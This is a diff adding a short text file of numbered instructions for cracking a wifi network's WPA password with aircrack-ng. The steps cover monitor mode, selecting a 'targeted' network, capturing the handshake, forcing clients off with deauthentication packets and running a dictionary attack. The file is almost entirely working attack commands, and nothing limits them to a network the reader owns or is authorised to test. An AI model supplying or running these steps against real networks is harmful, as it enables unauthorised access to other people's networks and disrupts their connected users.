@@ -1,0 +1,39 @@
+1) Install aircrack-ng:
+	sudo apt-get install aircrack-ng
+
+2) Find the wifi interface:
+	sudo apt install net-tools
+	ifconfig (or iwconfig)
+
+i.e: "wlp2s0"
+
+3) Set the wifi interface in monitor mode:
+	sudo airmon-ng start <wifi interface name>
+
+It should be enabled as "<wifi interface name>mon"
+i.e: "wlp2s0mon"
+
+4) List all available wifi networks
+	sudo airodump-ng wlp2s0mon
+
+5) Copy bssid of the targeted network
+
+6) Capture the handshake 
+	sudo airodump-ng --bssid <targeted bssid> -c <channel> -w <file to write> <interface name>
+
+7) Test if the handshake was found
+	sudo aircrack-ng <file name>-01.cap
+If it says something like "0 handshake" continue with the next step.
+
+8) Deauthorize the client so it reconnects with the handshake
+	sudo aireplay-ng --deauth 10 -a <target bssid> <interface name> --ignore-negative-one
+
+9) Repeat 7) and 8) until handshake is found
+
+10) Stop all running task
+	sudo airmon-ng stop <interface name>
+
+11) Apply dictionary attack
+	sudo aircrack-ng <capture file name> -w <passwords file>
+
+12) Done.
